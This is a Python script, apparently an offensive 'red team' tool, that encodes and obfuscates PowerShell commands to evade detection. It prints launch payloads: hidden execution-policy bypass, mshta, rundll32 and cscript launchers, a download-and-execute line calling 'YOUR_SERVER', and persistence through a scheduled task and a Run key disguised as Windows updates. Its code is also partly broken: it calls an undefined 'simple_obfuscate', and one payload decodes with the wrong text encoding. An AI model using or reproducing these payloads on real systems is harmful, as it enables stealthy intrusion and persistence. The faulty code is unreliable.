import base64
import argparse
import os
import random
import string
from urllib.parse import quote

def print_banner():
    banner = r"""
┏┓┏┓┏┓      ┓    
┃┃┗┓┣ ┏┓┏┏┓┏┫┏┓┏┓
┣┛┗┛┗┛┛┗┗┗┛┗┻┗ ┛ 
┏                
╋┏┓┏┓            
┛┗┛┛  ┓ ┓ ┏┓┏┓   
┏╋┏┓┏┓┃╋┣┓┃┃┃┃   
┛┗┗ ┗┻┗┗┛┗┗┛┣┛ 

  [🔬] Researched by d3hvck v2.1b
  [+] USAGE:
  [+] The program designed to use against Windows Labs, Do not use for illegal purpose
    If you want to encrypt command then use -c option
    python3 Exp_Encoder.py -c "powershell command" -o
    If you want to encrypt pre-made PowerShell ps1 file then use -f option
    python3 Exp_Encoder.py -f powershellfile.ps1 -o
"""
    print(banner)

def encode_ps_command(command):
    """Encode PowerShell command to base64 UTF-16LE"""
    utf16le_bytes = command.encode('utf-16le')
    b64_bytes = base64.b64encode(utf16le_bytes)
    return b64_bytes.decode()

def advanced_obfuscate(command, level=1):
    """
    Advanced obfuscation with multiple techniques
    
    Args:
        command (str): Command to obfuscate
        level (int): Obfuscation level (1-3)
    """
    
    replacements = {
        'powershell': ['pOwErShElL', 'PoWeRsHeLl', 'POWERSHELL'],
        'invoke': ['Inv`oke', 'INV`OKE', 'iNv`OkE'],
        'downloadstring': ['Downl`oadString', 'DOWNLOAD`STRING'],
        'frombasestring': ['Fr`omBase64String', 'FROM`BASE64STRING'],
        'iex': ['I`EX', 'iex', 'Iex'],
        'new-object': ['N`ew-Object', 'NEW`OBJECT'],
        'net.webclient': ['Net.We`bClient', 'NET.WEBC`LIENT'],
        'system.net.webclient': ['System.Net.We`bClient'],
        'getprocess': ['Get`Process'],
        'start-process': ['Start`Process']
    }
    
    def random_case(text):
        """Convert text to random case"""
        return ''.join(random.choice([char.upper(), char.lower()]) for char in text)
    
    def insert_backticks(text):
        """Insert random backticks"""
        if len(text) <= 3:
            return text
        position = random.randint(1, len(text)-2)
        return text[:position] + '`' + text[position:]
    
    def insert_whitespace(text):
        """Insert random whitespace"""
        whitespace_chars = [' ', '\t']
        result = []
        for char in text:
            result.append(char)
            if random.random() < 0.05:  # 5% chance
                result.append(random.choice(whitespace_chars))
        return ''.join(result)
    
    def split_strings(text):
        """Split strings and concatenate them"""
        import re
        def split_match(match):
            string_content = match.group(1)
            if len(string_content) > 5:
                split_point = len(string_content) // 2
                return f'"{string_content[:split_point]}" + "{string_content[split_point:]}"'
            return match.group(0)
        
        return re.sub(r'"([^"]*)"', split_match, text)
    
    obfuscated = command
    
    for key, variations in replacements.items():
        if key in obfuscated.lower():
            obfuscated = re.sub(re.escape(key), random.choice(variations), obfuscated, flags=re.IGNORECASE)
    
    if level >= 2:
        words = obfuscated.split()
        obfuscated_words = []
        for word in words:
            if random.random() < 0.4 and len(word) > 2:
                if random.random() < 0.5:
                    obfuscated_words.append(random_case(word))
                else:
                    obfuscated_words.append(insert_backticks(word))
            else:
                obfuscated_words.append(word)
        obfuscated = ' '.join(obfuscated_words)
        
        obfuscated = split_strings(obfuscated)
    
    if level >= 3:
        obfuscated = insert_whitespace(obfuscated)
    
    return obfuscated

def read_ps_file(file_path):
    """Read PowerShell file with error handling"""
    if not os.path.exists(file_path):
        print(f"[!] Error: File '{file_path}' not found")
        exit(1)
    
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            return f.read()
    except UnicodeDecodeError:
        try:
            with open(file_path, 'r', encoding='latin-1') as f:
                return f.read()
        except Exception as e:
            print(f"[!] Error reading file: {e}")
            exit(1)

def generate_advanced_payloads(encoded_command, original_command):
    """Generate multiple payload variations"""
    
    url_encoded = quote(encoded_command)
    
    print("\n" + "="*60)
    print("[+] BASIC PAYLOADS")
    print("="*60)
    
    print("\n[1] EncodedCommand only:")
    print(f"powershell -nop -w hidden -Exec Bypass -EncodedCommand {encoded_command}")
    
    print("\n[2] CMD Launcher:")
    print(f'cmd.exe /c "powershell -nop -w hidden -Exec Bypass -EncodedCommand {encoded_command}"')
    
    print("\n[3] One-liner with execution policy bypass:")
    print(f'powershell -Exec Bypass -Command "iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\'{encoded_command}\')))"')
    
    print("\n" + "="*60)
    print("[+] ALTERNATIVE LAUNCHERS")
    print("="*60)
    
    print("\n[4] MSHTA Launcher:")
    print(f'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Run(\'powershell -nop -w hidden -EncodedCommand {encoded_command}\',0);close();"')
    
    print("\n[5] RUNDLL32 Launcher:")
    print(f'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write(\'<script>self.close();new ActiveXObject("WScript.Shell").Run("powershell -nop -w hidden -EncodedCommand {encoded_command}",0);</script>\');"')
    
    print("\n[6] CSCRIPT Launcher:")
    print(f'''cscript //E:JScript //B "new ActiveXObject('WScript.Shell').Run('powershell -nop -w hidden -EncodedCommand {encoded_command}',0);"''')
    
    print("\n" + "="*60)
    print("[+] WEB DELIVERY & PERSISTENCE")
    print("="*60)
    
    print("\n[7] Web Download & Execute:")
    print(f'''powershell -c "iex (New-Object Net.WebClient).DownloadString('http://YOUR_SERVER/script.ps1')"''')
    print("# Replace with your web server hosting the encoded command")
    
    print("\n[8] Scheduled Task (Persistence):")
    print(f'''schtasks /create /tn "SystemUpdate" /tr "powershell -nop -w hidden -EncodedCommand {encoded_command}" /sc hourly /f''')
    
    print("\n[9] Registry Persistence:")
    print(f'''reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /t REG_SZ /d "powershell -nop -w hidden -EncodedCommand {encoded_command}" /f''')
    
    print("\n[10] Environment Variable Method:")
    env_payload = generate_env_payload(original_command)
    print(env_payload)

def generate_env_payload(command):
    """Split command into environment variables"""
    encoded = encode_ps_command(command)
    chunk_size = 20
    chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
    
    env_commands = ['# Environment Variable Method:']
    for i, chunk in enumerate(chunks):
        env_commands.append(f'$env:part{i} = "{chunk}"')
    
    reassemble = '+'.join([f'$env:part{i}' for i in range(len(chunks))])
    env_commands.append(f'$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String({reassemble}))')
    env_commands.append('IEX $decoded')
    
    return '\n'.join(env_commands)

def validate_powershell(command):
    """Basic PowerShell syntax validation"""
    if not command.strip():
        print("[!] Error: Empty command")
        return False
    
    ps_keywords = ['powershell', 'iex', 'invoke', 'new-object', 'get-', 'set-', 'write-']
    if not any(keyword in command.lower() for keyword in ps_keywords):
        print("[!] Warning: Command doesn't appear to be a PowerShell command")
        print("[!] Continue anyway? (y/n): ", end='')
        response = input().lower()
        if response != 'y':
            return False
    
    return True

def main():
    print_banner()
    parser = argparse.ArgumentParser(description="PowerShell Red Team Encoder", add_help=False)
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-c", "--command", help="PowerShell command to encode")
    group.add_argument("-f", "--file", help="PowerShell script file to encode")
    parser.add_argument("-o", "--obfuscate", action="store_true", help="Apply basic keyword obfuscation")
    parser.add_argument("-O", "--advanced-obfuscate", type=int, choices=[1,2,3], 
                       help="Advanced obfuscation level (1-3)")
    parser.add_argument("--no-banner", action="store_true", help="Hide banner")
    parser.add_argument("-h", "--help", action="store_true", help="Show help message")
    
    args = parser.parse_args()
    
    if args.help:
        print_banner()
        parser.print_help()
        print("\nExamples:")
        print("  python3 Exp_Encoder.py -c \"Get-Process\" -o")
        print("  python3 Exp_Encoder.py -f script.ps1 -O 2")
        print("  python3 Exp_Encoder.py -c \"iex (iwr http://example.com/script.ps1)\" --no-banner")
        return

    if not args.no_banner:
        print_banner()

    if args.file:
        input_command = read_ps_file(args.file)
        print(f"[+] Read {len(input_command)} characters from {args.file}")
    else:
        input_command = args.command

    if not validate_powershell(input_command):
        return

    original_length = len(input_command)
    if args.advanced_obfuscate:
        input_command = advanced_obfuscate(input_command, args.advanced_obfuscate)
        print(f"[+] Applied advanced obfuscation level {args.advanced_obfuscate}")
    elif args.obfuscate:
        input_command = simple_obfuscate(input_command)
        print("[+] Applied basic obfuscation")
    
    if args.obfuscate or args.advanced_obfuscate:
        print(f"[+] Command length: {original_length} -> {len(input_command)} characters")

    encoded = encode_ps_command(input_command)
    print(f"[+] Generated encoded command ({len(encoded)} characters)")
    
    generate_advanced_payloads(encoded, input_command)
    
    print("\n" + "="*60)
    print("[+] STATISTICS")
    print("="*60)
    print(f"Original size: {original_length} characters")
    print(f"Obfuscated size: {len(input_command)} characters") 
    print(f"Encoded size: {len(encoded)} characters")
    print(f"Compression ratio: {(len(encoded)/original_length)*100:.1f}%")

if __name__ == "__main__":
    import re  # Add this import at the top
    main()